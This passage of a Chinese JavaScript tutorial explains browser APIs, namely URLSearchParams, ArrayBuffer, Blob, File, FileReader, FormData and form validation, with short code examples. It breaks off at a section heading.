    > **（2）URL.revokeObjectURL()**
    >
    > `URL.revokeObjectURL()`方法用来释放`URL.createObjectURL()`方法生成的 URL 实例。它的参数就是`URL.createObjectURL()`方法返回的 URL 字符串。
    >
    > 下面为上一段的示例加上`URL.revokeObjectURL()`。
    >
    > ```
    > var div = document.getElementById('display');
    > 
    > function handleFiles(files) {
    >   for (var i = 0; i < files.length; i++) {
    >     var img = document.createElement('img');
    >     img.src = window.URL.createObjectURL(files[i]);
    >     div.appendChild(img);
    >     img.onload = function() {
    >       window.URL.revokeObjectURL(this.src);
    >     }
    >   }
    > }
    > ```
    >
    > 上面代码中，一旦图片加载成功以后，为本地文件生成的 URL 字符串就没用了，于是可以在`img.onload`回调函数里面，通过`URL.revokeObjectURL()`方法卸载这个 URL 实例。
    >
    > ## URLSearchParams 对象
    >
    > ### 概述
    >
    > `URLSearchParams`对象是浏览器的原生对象，用来构造、解析和处理 URL 的查询字符串（即 URL 问号后面的部分）。
    >
    > 它本身也是一个构造函数，可以生成实例。参数可以为查询字符串，起首的问号`?`有没有都行，也可以是对应查询字符串的数组或对象。
    >
    > ```
    > // 方法一：传入字符串
    > var params = new URLSearchParams('?foo=1&bar=2');
    > // 等同于
    > var params = new URLSearchParams(document.location.search);
    > 
    > // 方法二：传入数组
    > var params = new URLSearchParams([['foo', 1], ['bar', 2]]);
    > 
    > // 方法三：传入对象
    > var params = new URLSearchParams({'foo' : 1 , 'bar' : 2});
    > ```
    >
    > `URLSearchParams`会对查询字符串自动编码。
    >
    > ```
    > var params = new URLSearchParams({'foo': '你好'});
    > params.toString() // "foo=%E4%BD%A0%E5%A5%BD"
    > ```
    >
    > 上面代码中，`foo`的值是汉字，`URLSearchParams`对其自动进行 URL 编码。
    >
    > 浏览器向服务器发送表单数据时，可以直接使用`URLSearchParams`实例作为表单数据。
    >
    > ```
    > const params = new URLSearchParams({foo: 1, bar: 2});
    > fetch('https://example.com/api', {
    >   method: 'POST',
    >   body: params
    > }).then(...)
    > ```
    >
    > 上面代码中，`fetch`命令向服务器发送命令时，可以直接使用`URLSearchParams`实例。
    >
    > `URLSearchParams`可以与`URL()`接口结合使用。
    >
    > ```
    > var url = new URL(window.location);
    > var foo = url.searchParams.get('foo') || 'somedefault';
    > ```
    >
    > 上面代码中，URL 实例的`searchParams`属性就是一个`URLSearchParams`实例，所以可以使用`URLSearchParams`接口的`get`方法。
    >
    > `URLSearchParams`实例有迭代器接口，可以用`for...of`循环遍历（详见《ES6 标准入门》的《Iterator》一章）。
    >
    > ```
    > var params = new URLSearchParams({'foo': 1 , 'bar': 2});
    > 
    > for (var p of params) {
    >   console.log(p[0] + ': ' + p[1]);
    > }
    > // foo: 1
    > // bar: 2
    > ```
    >
    > `URLSearchParams`没有实例属性，只有实例方法。
    >
    > ### URLSearchParams.toString()
    >
    > `toString`方法返回实例的字符串形式。
    >
    > ```
    > var url = new URL('https://example.com?foo=1&bar=2');
    > var params = new URLSearchParams(url.search);
    > 
    > params.toString() // "foo=1&bar=2'
    > ```
    >
    > 那么需要字符串的场合，会自动调用`toString`方法。
    >
    > ```
    > var params = new URLSearchParams({version: 2.0});
    > window.location.href = location.pathname + '?' + params;
    > ```
    >
    > 上面代码中，`location.href`赋值时，可以直接使用`params`对象。这时就会自动调用`toString`方法。
    >
    > ### URLSearchParams.append()
    >
    > `append()`方法用来追加一个查询参数。它接受两个参数，第一个为键名，第二个为键值，没有返回值。
    >
    > ```
    > var params = new URLSearchParams({'foo': 1 , 'bar': 2});
    > params.append('baz', 3);
    > params.toString() // "foo=1&bar=2&baz=3"
    > ```
    >
    > `append()`方法不会识别是否键名已经存在。
    >
    > ```
    > var params = new URLSearchParams({'foo': 1 , 'bar': 2});
    > params.append('foo', 3);
    > params.toString() // "foo=1&bar=2&foo=3"
    > ```
    >
    > 上面代码中，查询字符串里面`foo`已经存在了，但是`append`依然会追加一个同名键。
    >
    > ### URLSearchParams.delete()
    >
    > `delete()`方法用来删除指定的查询参数。它接受键名作为参数。
    >
    > ```
    > var params = new URLSearchParams({'foo': 1 , 'bar': 2});
    > params.delete('bar');
    > params.toString() // "foo=1"
    > ```
    >
    > ### URLSearchParams.has()
    >
    > `has()`方法返回一个布尔值，表示查询字符串是否包含指定的键名。
    >
    > ```
    > var params = new URLSearchParams({'foo': 1 , 'bar': 2});
    > params.has('bar') // true
    > params.has('baz') // false
    > ```
    >
    > ### URLSearchParams.set()
    >
    > `set()`方法用来设置查询字符串的键值。
    >
    > 它接受两个参数，第一个是键名，第二个是键值。如果是已经存在的键，键值会被改写，否则会被追加。
    >
    > ```
    > var params = new URLSearchParams('?foo=1');
    > params.set('foo', 2);
    > params.toString() // "foo=2"
    > params.set('bar', 3);
    > params.toString() // "foo=2&bar=3"
    > ```
    >
    > 上面代码中，`foo`是已经存在的键，`bar`是还不存在的键。
    >
    > 如果有多个的同名键，`set`会移除现存所有的键。
    >
    > ```
    > var params = new URLSearchParams('?foo=1&foo=2');
    > params.set('foo', 3);
    > params.toString() // "foo=3"
    > ```
    >
    > 下面是一个替换当前 URL 的例子。
    >
    > ```
    > // URL: https://example.com?version=1.0
    > var params = new URLSearchParams(location.search.slice(1));
    > params.set('version', '2.0');
    > 
    > window.history.replaceState({}, '', location.pathname + `?` + params);
    > // URL: https://example.com?version=2.0
    > ```
    >
    > ### URLSearchParams.get()，URLSearchParams.getAll()
    >
    > `get()`方法用来读取查询字符串里面的指定键。它接受键名作为参数。
    >
    > ```
    > var params = new URLSearchParams('?foo=1');
    > params.get('foo') // "1"
    > params.get('bar') // null
    > ```
    >
    > 两个地方需要注意。第一，它返回的是字符串，如果原始值是数值，需要转一下类型；第二，如果指定的键名不存在，返回值是`null`。
    >
    > 如果有多个的同名键，`get`返回位置最前面的那个键值。
    >
    > ```
    > var params = new URLSearchParams('?foo=3&foo=2&foo=1');
    > params.get('foo') // "3"
    > ```
    >
    > 上面代码中，查询字符串有三个`foo`键，`get`方法返回最前面的键值`3`。
    >
    > `getAll()`方法返回一个数组，成员是指定键的所有键值。它接受键名作为参数。
    >
    > ```
    > var params = new URLSearchParams('?foo=1&foo=2');
    > params.getAll('foo') // ["1", "2"]
    > ```
    >
    > 上面代码中，查询字符串有两个`foo`键，`getAll`返回的数组就有两个成员。
    >
    > ### URLSearchParams.sort()
    >
    > `sort()`方法对查询字符串里面的键进行排序，规则是按照 Unicode 码点从小到大排列。
    >
    > 该方法没有返回值，或者说返回值是`undefined`。
    >
    > ```
    > var params = new URLSearchParams('c=4&a=2&b=3&a=1');
    > params.sort();
    > params.toString() // "a=2&a=1&b=3&c=4"
    > ```
    >
    > 上面代码中，如果有两个同名的键`a`，它们之间不会排序，而是保留原始的顺序。
    >
    > ### URLSearchParams.keys()，URLSearchParams.values()，URLSearchParams.entries()
    >
    > 这三个方法都返回一个迭代器对象，供`for...of`循环遍历。它们的区别在于，`keys`方法返回的是键名的迭代器，`values`方法返回的是键值的迭代器，`entries`返回的是键值对的迭代器。
    >
    > ```
    > var params = new URLSearchParams('a=1&b=2');
    > 
    > for(var p of params.keys()) {
    >   console.log(p);
    > }
    > // a
    > // b
    > 
    > for(var p of params.values()) {
    >   console.log(p);
    > }
    > // 1
    > // 2
    > 
    > for(var p of params.entries()) {
    >   console.log(p);
    > }
    > // ["a", "1"]
    > // ["b", "2"]
    > ```
    >
    > 如果直接对`URLSearchParams`进行遍历，其实内部调用的就是`entries`接口。
    >
    > ```
    > for (var p of params) {}
    > // 等同于
    > for (var p of params.entries()) {}
    > ```

  - ArrayBuffer 对象，Blob 对象

    > ## ArrayBuffer 对象
    >
    > ArrayBuffer 对象表示一段二进制数据，用来模拟内存里面的数据。通过这个对象，JS 可以读写二进制数据。这个对象可以看作内存数据的表达。
    >
    > 这个对象是 ES6 才写入标准的，普通的网页编程用不到它，为了教程体系的完整，下面只提供一个简略的介绍，详细介绍请看《ES6 标准入门》里面的章节。
    >
    > 浏览器原生提供`ArrayBuffer()`构造函数，用来生成实例。它接受一个整数作为参数，表示这段二进制数据占用多少个字节。
    >
    > ```
    > var buffer = new ArrayBuffer(8);
    > ```
    >
    > 上面代码中，实例对象`buffer`占用8个字节。
    >
    > ArrayBuffer 对象有实例属性`byteLength`，表示当前实例占用的内存长度（单位字节）。
    >
    > ```
    > var buffer = new ArrayBuffer(8);
    > buffer.byteLength // 8
    > ```
    >
    > ArrayBuffer 对象有实例方法`slice()`，用来复制一部分内存。它接受两个整数参数，分别表示复制的开始位置（从0开始）和结束位置（复制时不包括结束位置），如果省略第二个参数，则表示一直复制到结束。
    >
    > ```
    > var buf1 = new ArrayBuffer(8);
    > var buf2 = buf1.slice(0);
    > ```
    >
    > 上面代码表示复制原来的实例。
    >
    > ## Blob 对象
    >
    > ### 简介
    >
    > Blob 对象表示一个二进制文件的数据内容，比如一个图片文件的内容就可以通过 Blob 对象读写。它通常用来读写文件，它的名字是 Binary Large Object （二进制大型对象）的缩写。它与 ArrayBuffer 的区别在于，它用于操作二进制文件，而 ArrayBuffer 用于操作内存。
    >
    > 浏览器原生提供`Blob()`构造函数，用来生成实例对象。
    >
    > ```
    > new Blob(array [, options])
    > ```
    >
    > `Blob`构造函数接受两个参数。第一个参数是数组，成员是字符串或二进制对象，表示新生成的`Blob`实例对象的内容；第二个参数是可选的，是一个配置对象，目前只有一个属性`type`，它的值是一个字符串，表示数据的 MIME 类型，默认是空字符串。
    >
    > ```
    > var htmlFragment = ['<a id="a"><b id="b">hey!</b></a>'];
    > var myBlob = new Blob(htmlFragment, {type : 'text/html'});
    > ```
    >
    > 上面代码中，实例对象`myBlob`包含的是字符串。生成实例的时候，数据类型指定为`text/html`。
    >
    > 下面是另一个例子，Blob 保存 JSON 数据。
    >
    > ```
    > var obj = { hello: 'world' };
    > var blob = new Blob([ JSON.stringify(obj) ], {type : 'application/json'});
    > ```
    >
    > ### 实例属性和实例方法
    >
    > `Blob`具有两个实例属性`size`和`type`，分别返回数据的大小和类型。
    >
    > ```
    > var htmlFragment = ['<a id="a"><b id="b">hey!</b></a>'];
    > var myBlob = new Blob(htmlFragment, {type : 'text/html'});
    > 
    > myBlob.size // 32
    > myBlob.type // "text/html"
    > ```
    >
    > `Blob`具有一个实例方法`slice`，用来拷贝原来的数据，返回的也是一个`Blob`实例。
    >
    > ```
    > myBlob.slice(start, end, contentType)
    > ```
    >
    > `slice`方法有三个参数，都是可选的。它们依次是起始的字节位置（默认为0）、结束的字节位置（默认为`size`属性的值，该位置本身将不包含在拷贝的数据之中）、新实例的数据类型（默认为空字符串）。
    >
    > ### 获取文件信息
    >
    > 文件选择器`<input type="file">`用来让用户选取文件。出于安全考虑，浏览器不允许脚本自行设置这个控件的`value`属性，即文件必须是用户手动选取的，不能是脚本指定的。一旦用户选好了文件，脚本就可以读取这个文件。
    >
    > 文件选择器返回一个 FileList 对象，该对象是一个类似数组的成员，每个成员都是一个 File 实例对象。File 实例对象是一个特殊的 Blob 实例，增加了`name`和`lastModifiedDate`属性。
    >
    > ```
    > // HTML 代码如下
    > // <input type="file" accept="image/*" multiple onchange="fileinfo(this.files)"/>
    > 
    > function fileinfo(files) {
    >   for (var i = 0; i < files.length; i++) {
    >     var f = files[i];
    >     console.log(
    >       f.name, // 文件名，不含路径
    >       f.size, // 文件大小，Blob 实例属性
    >       f.type, // 文件类型，Blob 实例属性
    >       f.lastModifiedDate // 文件的最后修改时间
    >     );
    >   }
    > }
    > ```
    >
    > 除了文件选择器，拖放 API 的`dataTransfer.files`返回的也是一个FileList 对象，它的成员因此也是 File 实例对象。
    >
    > ### 下载文件
    >
    > AJAX 请求时，如果指定`responseType`属性为`blob`，下载下来的就是一个 Blob 对象。
    >
    > ```
    > function getBlob(url, callback) {
    >   var xhr = new XMLHttpRequest();
    >   xhr.open('GET', url);
    >   xhr.responseType = 'blob';
    >   xhr.onload = function () {
    >     callback(xhr.response);
    >   }
    >   xhr.send(null);
    > }
    > ```
    >
    > 上面代码中，`xhr.response`拿到的就是一个 Blob 对象。
    >
    > ### 生成 URL
    >
    > 浏览器允许使用`URL.createObjectURL()`方法，针对 Blob 对象生成一个临时 URL，以便于某些 API 使用。这个 URL 以`blob://`开头，表明对应一个 Blob 对象，协议头后面是一个识别符，用来唯一对应内存里面的 Blob 对象。这一点与`data://URL`（URL 包含实际数据）和`file://URL`（本地文件系统里面的文件）都不一样。
    >
    > ```
    > var droptarget = document.getElementById('droptarget');
    > 
    > droptarget.ondrop = function (e) {
    >   var files = e.dataTransfer.files;
    >   for (var i = 0; i < files.length; i++) {
    >     var type = files[i].type;
    >     if (type.substring(0,6) !== 'image/')
    >       continue;
    >     var img = document.createElement('img');
    >     img.src = URL.createObjectURL(files[i]);
    >     img.onload = function () {
    >       this.width = 100;
    >       document.body.appendChild(this);
    >       URL.revokeObjectURL(this.src);
    >     }
    >   }
    > }
    > ```
    >
    > 上面代码通过为拖放的图片文件生成一个 URL，产生它们的缩略图，从而使得用户可以预览选择的文件。
    >
    > 浏览器处理 Blob URL 就跟普通的 URL 一样，如果 Blob 对象不存在，返回404状态码；如果跨域请求，返回403状态码。Blob URL 只对 GET 请求有效，如果请求成功，返回200状态码。由于 Blob URL 就是普通 URL，因此可以下载。
    >
    > ### 读取文件
    >
    > 取得 Blob 对象以后，可以通过`FileReader`对象，读取 Blob 对象的内容，即文件内容。
    >
    > FileReader 对象提供四个方法，处理 Blob 对象。Blob 对象作为参数传入这些方法，然后以指定的格式返回。
    >
    > - `FileReader.readAsText()`：返回文本，需要指定文本编码，默认为 UTF-8。
    > - `FileReader.readAsArrayBuffer()`：返回 ArrayBuffer 对象。
    > - `FileReader.readAsDataURL()`：返回 Data URL。
    > - `FileReader.readAsBinaryString()`：返回原始的二进制字符串。
    >
    > 下面是`FileReader.readAsText()`方法的例子，用来读取文本文件。
    >
    > ```
    > // HTML 代码如下
    > // <input type="file" onchange="readfile(this.files[0])"></input>
    > // <pre id="output"></pre>
    > function readfile(f) {
    >   var reader = new FileReader();
    >   reader.readAsText(f);
    >   reader.onload = function () {
    >     var text = reader.result;
    >     var out = document.getElementById('output');
    >     out.innerHTML = '';
    >     out.appendChild(document.createTextNode(text));
    >   }
    >   reader.onerror = function(e) {
    >     console.log('Error', e);
    >   };
    > }
    > ```
    >
    > 上面代码中，通过指定 FileReader 实例对象的`onload`监听函数，在实例的`result`属性上拿到文件内容。
    >
    > 下面是`FileReader.readAsArrayBuffer()`方法的例子，用于读取二进制文件。
    >
    > ```
    > // HTML 代码如下
    > // <input type="file" onchange="typefile(this.files[0])"></input>
    > function typefile(file) {
    >   // 文件开头的四个字节，生成一个 Blob 对象
    >   var slice = file.slice(0, 4);
    >   var reader = new FileReader();
    >   // 读取这四个字节
    >   reader.readAsArrayBuffer(slice);
    >   reader.onload = function (e) {
    >     var buffer = reader.result;
    >     // 将这四个字节的内容，视作一个32位整数
    >     var view = new DataView(buffer);
    >     var magic = view.getUint32(0, false);
    >     // 根据文件的前四个字节，判断它的类型
    >     switch(magic) {
    >       case 0x89504E47: file.verified_type = 'image/png'; break;
    >       case 0x47494638: file.verified_type = 'image/gif'; break;
    >       case 0x25504446: file.verified_type = 'application/pdf'; break;
    >       case 0x504b0304: file.verified_type = 'application/zip'; break;
    >     }
    >     console.log(file.name, file.verified_type);
    >   };
    > }
    > ```

  - File 对象，FileList 对象，FileReader 对象

    > ## File 对象
    >
    > File 对象代表一个文件，用来读写文件信息。它继承了 Blob 对象，或者说是一种特殊的 Blob 对象，所有可以使用 Blob 对象的场合都可以使用它。
    >
    > 最常见的使用场合是表单的文件上传控件（`<input type="file">`），用户选中文件以后，浏览器就会生成一个数组，里面是每一个用户选中的文件，它们都是 File 实例对象。
    >
    > ```
    > // HTML 代码如下
    > // <input id="fileItem" type="file">
    > var file = document.getElementById('fileItem').files[0];
    > file instanceof File // true
    > ```
    >
    > 上面代码中，`file`是用户选中的第一个文件，它是 File 的实例。
    >
    > ### 构造函数
    >
    > 浏览器原生提供一个`File()`构造函数，用来生成 File 实例对象。
    >
    > ```
    > new File(array, name [, options])
    > ```
    >
    > `File()`构造函数接受三个参数。
    >
    > - array：一个数组，成员可以是二进制对象或字符串，表示文件的内容。
    > - name：字符串，表示文件名或文件路径。
    > - options：配置对象，设置实例的属性。该参数可选。
    >
    > 第三个参数配置对象，可以设置两个属性。
    >
    > - type：字符串，表示实例对象的 MIME 类型，默认值为空字符串。
    > - lastModified：时间戳，表示上次修改的时间，默认为`Date.now()`。
    >
    > 下面是一个例子。
    >
    > ```
    > var file = new File(
    >   ['foo'],
    >   'foo.txt',
    >   {
    >     type: 'text/plain',
    >   }
    > );
    > ```
    >
    > ### 实例属性和实例方法
    >
    > File 对象有以下实例属性。
    >
    > - File.lastModified：最后修改时间
    > - File.name：文件名或文件路径
    > - File.size：文件大小（单位字节）
    > - File.type：文件的 MIME 类型
    >
    > ```
    > var myFile = new File([], 'file.bin', {
    >   lastModified: new Date(2018, 1, 1),
    > });
    > myFile.lastModified // 1517414400000
    > myFile.name // "file.bin"
    > myFile.size // 0
    > myFile.type // ""
    > ```
    >
    > 上面代码中，由于`myFile`的内容为空，也没有设置 MIME 类型，所以`size`属性等于0，`type`属性等于空字符串。
    >
    > File 对象没有自己的实例方法，由于继承了 Blob 对象，因此可以使用 Blob 的实例方法`slice()`。
    >
    > ## FileList 对象
    >
    > `FileList`对象是一个类似数组的对象，代表一组选中的文件，每个成员都是一个 File 实例。它主要出现在两个场合。
    >
    > - 文件控件节点（`<input type="file">`）的`files`属性，返回一个 FileList 实例。
    > - 拖拉一组文件时，目标区的`DataTransfer.files`属性，返回一个 FileList 实例。
    >
    > ```
    > // HTML 代码如下
    > // <input id="fileItem" type="file">
    > var files = document.getElementById('fileItem').files;
    > files instanceof FileList // true
    > ```
    >
    > 上面代码中，文件控件的`files`属性是一个 FileList 实例。
    >
    > FileList 的实例属性主要是`length`，表示包含多少个文件。
    >
    > FileList 的实例方法主要是`item()`，用来返回指定位置的实例。它接受一个整数作为参数，表示位置的序号（从零开始）。但是，由于 FileList 的实例是一个类似数组的对象，可以直接用方括号运算符，即`myFileList[0]`等同于`myFileList.item(0)`，所以一般用不到`item()`方法。
    >
    > ## FileReader 对象
    >
    > FileReader 对象用于读取 File 对象或 Blob 对象所包含的文件内容。
    >
    > 浏览器原生提供一个`FileReader`构造函数，用来生成 FileReader 实例。
    >
    > ```
    > var reader = new FileReader();
    > ```
    >
    > FileReader 有以下的实例属性。
    >
    > - FileReader.error：读取文件时产生的错误对象
    > - FileReader.readyState：整数，表示读取文件时的当前状态。一共有三种可能的状态，`0`表示尚未加载任何数据，`1`表示数据正在加载，`2`表示加载完成。
    > - FileReader.result：读取完成后的文件内容，有可能是字符串，也可能是一个 ArrayBuffer 实例。
    > - FileReader.onabort：`abort`事件（用户终止读取操作）的监听函数。
    > - FileReader.onerror：`error`事件（读取错误）的监听函数。
    > - FileReader.onload：`load`事件（读取操作完成）的监听函数，通常在这个函数里面使用`result`属性，拿到文件内容。
    > - FileReader.onloadstart：`loadstart`事件（读取操作开始）的监听函数。
    > - FileReader.onloadend：`loadend`事件（读取操作结束）的监听函数。
    > - FileReader.onprogress：`progress`事件（读取操作进行中）的监听函数。
    >
    > 下面是监听`load`事件的一个例子。
    >
    > ```
    > // HTML 代码如下
    > // <input type="file" onchange="onChange(event)">
    > 
    > function onChange(event) {
    >   var file = event.target.files[0];
    >   var reader = new FileReader();
    >   reader.onload = function (event) {
    >     console.log(event.target.result)
    >   };
    > 
    >   reader.readAsText(file);
    > }
    > ```
    >
    > 上面代码中，每当文件控件发生变化，就尝试读取第一个文件。如果读取成功（`load`事件发生），就打印出文件内容。
    >
    > FileReader 有以下实例方法。
    >
    > - FileReader.abort()：终止读取操作，`readyState`属性将变成`2`。
    > - FileReader.readAsArrayBuffer()：以 ArrayBuffer 的格式读取文件，读取完成后`result`属性将返回一个 ArrayBuffer 实例。
    > - FileReader.readAsBinaryString()：读取完成后，`result`属性将返回原始的二进制字符串。
    > - FileReader.readAsDataURL()：读取完成后，`result`属性将返回一个 Data URL 格式（Base64 编码）的字符串，代表文件内容。对于图片文件，这个字符串可以用于`<img>`元素的`src`属性。注意，这个字符串不能直接进行 Base64 解码，必须把前缀`data:*/*;base64,`从字符串里删除以后，再进行解码。
    > - FileReader.readAsText()：读取完成后，`result`属性将返回文件内容的文本字符串。该方法的第一个参数是代表文件的 Blob 实例，第二个参数是可选的，表示文本编码，默认为 UTF-8。
    >
    > 下面是一个例子。
    >
    > ```
    > /* HTML 代码如下
    >   <input type="file" onchange="previewFile()">
    >   <img src="" height="200">
    > */
    > 
    > function previewFile() {
    >   var preview = document.querySelector('img');
    >   var file    = document.querySelector('input[type=file]').files[0];
    >   var reader  = new FileReader();
    > 
    >   reader.addEventListener('load', function () {
    >     preview.src = reader.result;
    >   }, false);
    > 
    >   if (file) {
    >     reader.readAsDataURL(file);
    >   }
    > }
    > ```
    >
    > 上面代码中，用户选中图片文件以后，脚本会自动读取文件内容，然后作为一个 Data URL 赋值给`<img>`元素的`src`属性，从而把图片展示出来。

  - 表单，FormData 对象

    > ## 表单概述
    >
    > 表单（`<form>`）用来收集用户提交的数据，发送到服务器。比如，用户提交用户名和密码，让服务器验证，就要通过表单。表单提供多种控件，让开发者使用，具体的控件种类和用法请参考 HTML 语言的教程。本章主要介绍 JS 与表单的交互。
    >
    > ```
    > <form action="/handling-page" method="post">
    >   <div>
    >     <label for="name">用户名：</label>
    >     <input type="text" id="name" name="user_name" />
    >   </div>
    >   <div>
    >     <label for="passwd">密码：</label>
    >     <input type="password" id="passwd" name="user_passwd" />
    >   </div>
    >   <div>
    >     <input type="submit" id="submit" name="submit_button" value="提交" />
    >   </div>
    > </form>
    > ```
    >
    > 上面代码就是一个简单的表单，包含三个控件：用户名输入框、密码输入框和提交按钮。
    >
    > 用户点击“提交”按钮，每一个控件都会生成一个键值对，键名是控件的`name`属性，键值是控件的`value`属性，键名和键值之间由等号连接。比如，用户名输入框的`name`属性是`user_name`，`value`属性是用户输入的值，假定是“张三”，提交到服务器的时候，就会生成一个键值对`user_name=张三`。
    >
    > 所有的键值对都会提交到服务器。但是，提交的数据格式跟`<form>`元素的`method`属性有关。该属性指定了提交数据的 HTTP 方法。如果是 GET 方法，所有键值对会以 URL 的查询字符串形式，提交到服务器，比如`/handling-page?user_name=张三&user_passwd=123&submit_button=提交`。下面就是 GET 请求的 HTTP 头信息。
    >
    > ```
    > GET /handling-page?user_name=张三&user_passwd=123&submit_button=提交
    > Host: example.com
    > ```
    >
    > 如果是 POST 方法，所有键值对会连接成一行，作为 HTTP 请求的数据体发送到服务器，比如`user_name=张三&user_passwd=123&submit_button=提交`。下面就是 POST 请求的头信息。
    >
    > ```
    > POST /handling-page HTTP/1.1
    > Host: example.com
    > Content-Type: application/x-www-form-urlencoded
    > Content-Length: 74
    > 
    > user_name=张三&user_passwd=123&submit_button=提交
    > ```
    >
    > 注意，实际提交的时候，只要键值不是 URL 的合法字符（比如汉字“张三”和“提交”），浏览器会自动对其进行编码。
    >
    > 点击`submit`控件，就可以提交表单。
    >
    > ```
    > <form>
    >   <input type="submit" value="提交">
    > </form>
    > ```
    >
    > 上面表单就包含一个`submit`控件，点击这个控件，浏览器就会把表单数据向服务器提交。
    >
    > 注意，表单里面的`<button>`元素如果没有用`type`属性指定类型，那么默认就是`submit`控件。
    >
    > ```
    > <form>
    >   <button>提交</button>
    > </form>
    > ```
    >
    > 上面表单的`<button>`元素，点击以后也会提交表单。
    >
    > 除了点击`submit`控件提交表单，还可以用表单元素的`submit()`方法，通过脚本提交表单。
    >
    > ```
    > formElement.submit();
    > ```
    >
    > 表单元素的`reset()`方法可以重置所有控件的值（重置为默认值）。
    >
    > ```
    > formElement.reset()
    > ```
    >
    > ## FormData 对象
    >
    > ### 概述
    >
    > 表单数据以键值对的形式向服务器发送，这个过程是浏览器自动完成的。但是有时候，我们希望通过脚本完成这个过程，构造或编辑表单的键值对，然后通过脚本发送给服务器。浏览器原生提供了 FormData 对象来完成这项工作。
    >
    > `FormData()`首先是一个构造函数，用来生成表单的实例。
    >
    > ```
    > var formdata = new FormData(form);
    > ```
    >
    > `FormData()`构造函数的参数是一个 DOM 的表单元素，构造函数会自动处理表单的键值对。这个参数是可选的，如果省略该参数，就表示一个空的表单。
    >
    > 下面是一个表单。
    >
    > ```
    > <form id="myForm" name="myForm">
    >   <div>
    >     <label for="username">用户名：</label>
    >     <input type="text" id="username" name="username">
    >   </div>
    >   <div>
    >     <label for="useracc">账号：</label>
    >     <input type="text" id="useracc" name="useracc">
    >   </div>
    >   <div>
    >     <label for="userfile">上传文件：</label>
    >     <input type="file" id="userfile" name="userfile">
    >   </div>
    > <input type="submit" value="Submit!">
    > </form>
    > ```
    >
    > 我们用`FormData()`处理上面这个表单。
    >
    > ```
    > var myForm = document.getElementById('myForm');
    > var formData = new FormData(myForm);
    > 
    > // 获取某个控件的值
    > formData.get('username') // ""
    > 
    > // 设置某个控件的值
    > formData.set('username', '张三');
    > 
    > formData.get('username') // "张三"
    > ```
    >
    > ### 实例方法
    >
    > FormData 提供以下实例方法。
    >
    > - `FormData.get(key)`：获取指定键名对应的键值，参数为键名。如果有多个同名的键值对，则返回第一个键值对的键值。
    > - `FormData.getAll(key)`：返回一个数组，表示指定键名对应的所有键值。如果有多个同名的键值对，数组会包含所有的键值。
    > - `FormData.set(key, value)`：设置指定键名的键值，参数为键名。如果键名不存在，会添加这个键值对，否则会更新指定键名的键值。如果第二个参数是文件，还可以使用第三个参数，表示文件名。
    > - `FormData.delete(key)`：删除一个键值对，参数为键名。
    > - `FormData.append(key, value)`：添加一个键值对。如果键名重复，则会生成两个相同键名的键值对。如果第二个参数是文件，还可以使用第三个参数，表示文件名。
    > - `FormData.has(key)`：返回一个布尔值，表示是否具有该键名的键值对。
    > - `FormData.keys()`：返回一个迭代器对象，用于`for...of`循环遍历所有的键名。
    > - `FormData.values()`：返回一个迭代器对象，用于`for...of`循环遍历所有的键值。
    > - `FormData.entries()`：返回一个迭代器对象，用于`for...of`循环遍历所有的键值对。如果直接用`for...of`循环遍历 FormData 实例，默认就会调用这个方法。
    >
    > 下面是`get()`、`getAll()`、`set()`、`append()`方法的例子。
    >
    > ```
    > var formData = new FormData();
    > 
    > formData.set('username', '张三');
    > formData.append('username', '李四');
    > formData.get('username') // "张三"
    > formData.getAll('username') // ["张三", "李四"]
    > 
    > formData.append('userpic[]', myFileInput.files[0], 'user1.jpg');
    > formData.append('userpic[]', myFileInput.files[1], 'user2.jpg');
    > ```
    >
    > 下面是迭代器的例子。
    >
    > ```
    > var formData = new FormData();
    > formData.append('key1', 'value1');
    > formData.append('key2', 'value2');
    > 
    > for (var key of formData.keys()) {
    >   console.log(key);
    > }
    > // "key1"
    > // "key2"
    > 
    > for (var value of formData.values()) {
    >   console.log(value);
    > }
    > // "value1"
    > // "value2"
    > 
    > for (var pair of formData.entries()) {
    >   console.log(pair[0] + ': ' + pair[1]);
    > }
    > // key1: value1
    > // key2: value2
    > 
    > // 等同于遍历 formData.entries()
    > for (var pair of formData) {
    >   console.log(pair[0] + ': ' + pair[1]);
    > }
    > // key1: value1
    > // key2: value2
    > ```
    >
    > ## 表单的内置验证
    >
    > ### 自动校验
    >
    > 表单提交的时候，浏览器允许开发者指定一些条件，它会自动验证各个表单控件的值是否符合条件。
    >
    > ```
    > <!-- 必填 -->
    > <input required>
    > 
    > <!-- 必须符合正则表达式 -->
    > <input pattern="banana|cherry">
    > 
    > <!-- 字符串长度必须为6个字符 -->
    > <input minlength="6" maxlength="6">
    > 
    > <!-- 数值必须在1到10之间 -->
    > <input type="number" min="1" max="10">
    > 
    > <!-- 必须填入 Email 地址 -->
    > <input type="email">
    > 
    > <!-- 必须填入 URL -->
    > <input type="URL">
    > ```
    >
    > 如果一个控件通过验证，它就会匹配`:valid`的 CSS 伪类，浏览器会继续进行表单提交的流程。如果没有通过验证，该控件就会匹配`:invalid`的 CSS 伪类，浏览器会终止表单提交，并显示一个错误信息。
    >
    > ```
    > input:invalid {
    >   border-color: red;
    > }
    > input,
    > input:valid {
    >   border-color: #ccc;
    > }
    > ```
    >
    > ### checkValidity()
    >
    > 除了提交表单的时候，浏览器自动校验表单，还可以手动触发表单的校验。表单元素和表单控件都有`checkValidity()`方法，用于手动触发校验。
    >
    > ```
    > // 触发整个表单的校验
    > form.checkValidity()
    > 
    > // 触发单个表单控件的校验
    > formControl.checkValidity()
    > ```
    >
    > `checkValidity()`方法返回一个布尔值，`true`表示通过校验，`false`表示没有通过校验。因此，提交表单可以封装为下面的函数。
    >
    > ```
    > function submitForm(action) {
    >   var form = document.getElementById('form');
    >   form.action = action;
    >   if (form.checkValidity()) {
    >     form.submit();
    >   }
    > }
    > ```
    >
    > ### willValidate 属性
    >
    > 控件元素的`willValidate`属性是一个布尔值，表示该控件是否会在提交时进行校验。
    >
    > ```
    > // HTML 代码如下
    > // <form novalidate>
    > //   <input id="name" name="name" required />
    > // </form>
    > 
    > var input = document.querySelector('#name');
    > input.willValidate // true
    > ```
    >
    > ### validationMessage 属性
    >
    > 控件元素的`validationMessage`属性返回一个字符串，表示控件不满足校验条件时，浏览器显示的提示文本。以下两种情况，该属性返回空字符串。
    >
    > - 该控件不会在提交时自动校验
    > - 该控件满足校验条件
    >
    > ```
    > // HTML 代码如下
    > // <form><input type="text" required></form>
    > document.querySelector('form input').validationMessage
    > // "请填写此字段。"
    > ```
    >
    > 下面是另一个例子。
    >
    > ```
    > var myInput = document.getElementById('myinput');
    > if (!myInput.checkValidity()) {
    >   document.getElementById('prompt').innerHTML = myInput.validationMessage;
    > }
    > ```
    >
    > ### setCustomValidity()
    >
